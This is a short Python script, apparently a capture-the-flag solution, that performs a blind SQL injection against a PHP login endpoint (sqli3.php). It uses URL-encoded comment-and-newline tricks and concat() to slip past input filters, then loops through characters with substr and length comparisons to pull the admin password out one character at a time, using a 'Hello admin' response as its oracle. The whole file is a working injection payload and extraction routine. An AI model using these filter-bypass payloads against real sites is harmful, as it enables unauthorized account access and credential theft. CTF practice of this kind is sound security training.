import requests

def is_ok(response_text):
    return response_text.startswith('Hello admin')

key_full = [chr(i) for i in range(32, 127)]
flag = ''
# Make the request
for cnt in range(1,100):
    cnt_use = False
    for i in range(32,127):
        payload = f"Binary%23%0asubstr(userpw,length('{'_'*cnt}'),length('_'))=char(length('{'_'*i}'))"
        url = (
            "http://2024fsec.arang.kr:9200/sqli3.php?"
            "userid=userid=a%27=%27a%27%23%0a"
            "and%23%0auserid=concat(%27ad%27,%27min%27)%23%0a"
            f"and%23%0a{payload}%23&userpw=guest"
        )
        response = requests.get(url)

#        print(response.status_code)
#        print(response.content.decode())
#        break
        if is_ok(response.text[:11]):
            flag+=chr(i)
            print(flag)
            cnt_use = True
            break
    print(cnt,cnt_use)
